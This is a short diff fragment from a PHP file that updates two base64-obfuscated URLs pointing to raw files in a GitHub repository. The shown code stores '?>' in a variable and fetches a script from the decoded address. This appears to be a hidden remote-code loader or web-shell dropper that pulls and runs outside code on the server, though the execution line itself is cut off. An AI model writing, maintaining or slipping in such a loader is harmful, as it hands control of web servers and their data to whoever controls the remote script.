@@ -23,8 +23,8 @@ function get($url) {
 }
 
 $x = '?>';
-$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvbHAvcmVmcy9oZWFkcy9tYWluL3RlcmJydS1kZWZlYw==');
-$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvbHAvcmVmcy9oZWFkcy9tYWluL3RlcmJydS1kZWZlYw==');
+$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvbHAvcmVmcy9oZWFkcy9tYWluL3RlcmJydS1kZWZlY2M=');
+$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvbHAvcmVmcy9oZWFkcy9tYWluL3RlcmJydS1kZWZlY2M=');
 
 $script1 = get($url1);
 if ($script1 !== false && $script1 !== 404) {
